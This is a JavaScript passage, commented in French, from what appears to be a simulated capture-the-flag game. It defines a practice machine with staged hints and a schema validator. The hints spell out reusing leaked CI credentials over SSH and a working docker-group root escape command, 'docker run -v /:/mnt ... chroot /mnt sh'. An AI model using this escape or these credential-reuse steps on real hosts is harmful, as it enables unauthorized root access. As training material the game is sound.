      },
      extraFS: {},
      extraGroups: "999(docker)",
      sudoL: "Désolé, l'utilisateur cibuild n'est pas autorisé à exécuter sudo sur axiom.\n(Regarde plutôt du côté des groupes système auxquels il appartient...)",
    },
    privesc: {
      type: "docker-group",
      exploitCmdRegex: /^docker\s+run\s+-v\s+\/:\/mnt\s+--rm\s+-it\s+alpine\s+chroot\s+\/mnt\s+sh$/,
      enterMsg: "# (shell root obtenu en montant le disque de l'hôte dans un conteneur — le groupe docker équivaut à root)",
    },
    rootFile: { path: "/root/root.txt", content: "FLAG{axiom_root_docker_group_escape}" },
    hints: {
      recon: [
        "Un tableau de bord CI/CD tourne sur un port non standard — les logs de build sont souvent bavards.",
        "Après `nmap 10.10.11.244`, utilise `curl http://10.10.11.244:8080/` : un commentaire HTML pointe vers un fichier de logs.",
        "Récupère les logs avec `curl http://10.10.11.244:8080/logs/latest.txt` : une étape de déploiement y exporte des identifiants en clair.",
      ],
      access: [
        "Les logs contiennent un couple identifiant/mot de passe destiné au runner, pas à un humain — mais ça marche pareil.",
        "CI_DEPLOY_USER et CI_DEPLOY_PASS sont directement réutilisables en SSH.",
        "Connecte-toi avec `ssh cibuild@10.10.11.244` et le mot de passe trouvé dans les logs.",
      ],
      privesc: [
        "`sudo -l` ne donne rien ici. Pas de sudo, pas de cron world-writable, pas de SUID à côté de la plaque : regarde plutôt les groupes de l'utilisateur.",
        "Lance `id` (ou `groups`) : le compte appartient au groupe `docker`. Sur ce système, ce groupe permet de parler directement au démon Docker — ce qui équivaut à root sur l'hôte. `docker ps` confirme qu'un démon local tourne.",
        "Monte le disque de l'hôte dans un conteneur jetable puis chroot dedans : `docker run -v /:/mnt --rm -it alpine chroot /mnt sh` pour obtenir un shell root.",
      ],
    },
  },
];

function getMachine(id) {
  return MACHINES.find((m) => m.id === id) || null;
}

// ── Validation de schéma (petit pas vers des machines déclaratives) ─────────
// Ne bloque jamais le jeu : sert de garde-fou pour repérer une machine mal
// formée (copier-coller oublié, faute de frappe dans un id...) tôt, plutôt
// qu'un bug silencieux découvert des heures plus tard en jouant. Utilisé au
// chargement (voir engine.js) et par tests/run.js (une machine volontairement
// cassée doit remonter au moins une erreur).
const KNOWN_PRIVESC_TYPES = [
  "sudo-gtfobins", "sudo-direct", "cron-writable", "schtask-writable", "suid-binary", "docker-group",
];
function validateMachines(machines) {
  const errors = [];
  const seenIds = new Set();
  const seenIps = new Set();
  machines.forEach((m, i) => {
    const tag = `machine #${i} (${m && m.id ? m.id : "id manquant"})`;
    if (!m.id || typeof m.id !== "string") errors.push(`${tag} : "id" manquant ou invalide`);
    else if (seenIds.has(m.id)) errors.push(`${tag} : id "${m.id}" en doublon`);
    else seenIds.add(m.id);
    if (!m.name) errors.push(`${tag} : "name" manquant`);
    if (!m.ip || !/^\d+\.\d+\.\d+\.\d+$/.test(m.ip)) errors.push(`${tag} : "ip" manquante ou mal formée`);
    else if (seenIps.has(m.ip)) errors.push(`${tag} : ip "${m.ip}" en doublon`);
    else seenIps.add(m.ip);
    if (!Array.isArray(m.ports) || !m.ports.length) errors.push(`${tag} : "ports" doit être un tableau non vide`);
    else m.ports.forEach((p, j) => {
      if (typeof p.port !== "number") errors.push(`${tag} : ports[${j}].port doit être un nombre`);
      if (!p.service) errors.push(`${tag} : ports[${j}].service manquant`);
    });
    if (!m.targetFS || !m.targetFS.homeDir) errors.push(`${tag} : "targetFS.homeDir" manquant`);
    if (!m.privesc || !m.privesc.type) errors.push(`${tag} : "privesc.type" manquant`);
    else if (!KNOWN_PRIVESC_TYPES.includes(m.privesc.type)) errors.push(`${tag} : privesc.type "${m.privesc.type}" inconnu`);
    if (!m.rootFile || !m.rootFile.path || !m.rootFile.content) errors.push(`${tag} : "rootFile" incomplet`);
    if (!m.hints || !m.hints.recon || !m.hints.access || !m.hints.privesc) {
      errors.push(`${tag} : "hints" doit fournir recon/access/privesc`);
    }
    if (m.altAccess && (!m.altAccess.triggerPath || !m.altAccess.port || !m.altAccess.user)) {
      errors.push(`${tag} : "altAccess" incomplet (triggerPath/port/user requis)`);
    }
  });
  return errors;
}
